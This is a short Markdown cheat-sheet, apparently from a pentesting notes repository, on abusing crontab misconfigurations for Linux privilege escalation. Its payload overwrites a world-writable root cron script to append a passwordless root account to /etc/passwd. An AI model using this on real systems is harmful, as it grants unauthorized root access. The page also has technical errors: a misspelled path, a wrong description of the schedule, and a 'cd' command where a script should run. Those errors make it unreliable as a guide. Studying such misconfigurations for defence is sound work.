# CronTab MissConfigurations

A crontab file contains instructions to the cron daemon of the general form: "run this command at this time on this date".

Each User own a crontab file.

### Table of Contents

- [Crontab syntax](#crontab-syntax)
- [Recognition](#recognition)
- [Usage](#usage)
- [Privilege Escalation](#privilege-escalation)
- [Docu](#documentation)

## Crontab syntax

```crontab
* * * * * <command to be executed>
- - - - -
| | | | |
| | | | ----- Weekday (0 - 7) (Sunday is 0 or 7, Monday is 1...)
| | | ------- Month (1 - 12)
| | --------- Day (1 - 31)
| ----------- Hour (0 - 23)
------------- Minute (0 - 59)
```

In system-wide crontabs, you can specify the user.

```crontab
* * * * * <username> <command to be executed>
```

## Recognition

List and verify every crontab call to find a vulnerability:

- current cron for the user:

  ```bash
  $>crontab -l
  ```

- system-wide crontab

  /etc/cron.d
  /ect/cron.hourly
  /etc/cron.daily
  /etc/cron.weekly
  /etc/cron.monthly

## Usage

By default, Cron runs as root when executing /etc/crontab, so any commands or scripts that are called by the crontab will also run as root.

#### Call a script write /etc/cron.\*

```bash
01 * * * * root run-parts /etc/cron.hourly
```

## Privilege Escalation

### Two way to escalade privilege with CronTab

#### Miss protected script

/etc/cron call a script miss protected (every user can edit it, and make their command executable by the root)

```bash
3 * * * * cd /path/to/script.sh

# every 3 min the script is launch by root
$>ls -la /path/to/script.sh
-rw-rw-rw- 1 root root 11833 Aug 30  2015
#every one can modify it
$>echo '“gottie::0:0:System Administrator:/root/root:/bin/bash” >> /etc/passwd ' > /path/to/script.sh
#next call to the script, gottie is now a root with no passwd to login
```

#### Vulnerable Script

If you can't write into the script maybe you can find a vulnerablily inside it!

### Documentation

- [Man crontab](https://linux.die.net/man/5/crontab)
- [Crontab privilege Esacalad](https://medium.com/swlh/privilege-escalation-via-cron-812a9da9cf1a)

---

[**:arrow_right_hook:Back home**](../README.md)
